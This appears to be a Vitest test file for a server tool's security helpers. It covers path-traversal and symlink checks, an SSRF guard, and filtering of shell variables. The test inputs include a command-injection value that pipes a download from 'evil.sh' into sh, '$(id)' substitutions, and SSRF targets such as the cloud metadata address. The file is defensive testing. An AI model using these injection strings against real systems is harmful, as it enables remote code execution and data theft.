import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "fs";
import os from "os";
import path from "path";
import { isInside, safeResolve, isValidServerId, assertPublicHttpUrl } from "../src/server/utils/security";
import { substituteVars } from "../src/server/utils/shellVars";

let base: string;
beforeEach(() => { base = fs.mkdtempSync(path.join(os.tmpdir(), "sec-")); });
afterEach(() => { fs.rmSync(base, { recursive: true, force: true }); });

describe("path safety", () => {
  it("allows paths inside and rejects traversal", () => {
    expect(isInside(base, path.join(base, "a/b.txt"))).toBe(true);
    expect(isInside(base, path.join(base, "../x"))).toBe(false);
    expect(safeResolve(base, "../../etc/passwd")).toBeNull();
    expect(safeResolve(base, "plugins", "x.jar")).toBe(path.join(base, "plugins", "x.jar"));
  });
  it("rejects sibling directories that merely share a prefix", () => {
    expect(isInside(base, base + "-other/file")).toBe(false);
  });
  it("rejects a symlink that points outside the base", () => {
    fs.symlinkSync("/etc", path.join(base, "evil"));
    expect(isInside(base, path.join(base, "evil", "passwd"))).toBe(false);
    expect(safeResolve(base, "evil", "passwd")).toBeNull();
  });
  it("validates server ids", () => {
    expect(isValidServerId("abc-123_X")).toBe(true);
    for (const bad of ["../x", "a/b", "", "a b", "a;b", 5, null]) expect(isValidServerId(bad as any)).toBe(false);
  });
});

describe("SSRF guard", () => {
  it.each([
    "http://127.0.0.1/x", "http://localhost/x", "http://169.254.169.254/latest/meta-data",
    "http://10.0.0.5/", "http://192.168.1.1/", "http://[::1]/", "http://172.16.0.1/",
  ])("blocks %s", async (url) => {
    await expect(assertPublicHttpUrl(url)).rejects.toThrow();
  });
  it("blocks non-http schemes and embedded credentials", async () => {
    await expect(assertPublicHttpUrl("file:///etc/passwd")).rejects.toThrow();
    await expect(assertPublicHttpUrl("ftp://example.com/x")).rejects.toThrow();
    await expect(assertPublicHttpUrl("https://user:pw@example.com/")).rejects.toThrow();
  });
});

describe("native engine startup substitution (host shell!)", () => {
  const vars = { MAP: "de_dust2", EVIL: "x; curl evil.sh | sh", EVIL2: "$(id)", EVIL3: "a`id`", FLAGS: "-Xmx2G -Dfoo=bar" };
  it("keeps normal values", () => {
    expect(substituteVars("run {{MAP}} {{FLAGS}}", vars)).toBe("run de_dust2 -Xmx2G -Dfoo=bar");
  });
  it("drops values containing shell control characters", () => {
    for (const k of ["EVIL", "EVIL2", "EVIL3"]) expect(substituteVars(`run {{${k}}}`, vars)).toBe("run ");
  });
  it("renders unknown variables as empty", () => {
    expect(substituteVars("a{{NOPE}}b", vars)).toBe("ab");
  });
});
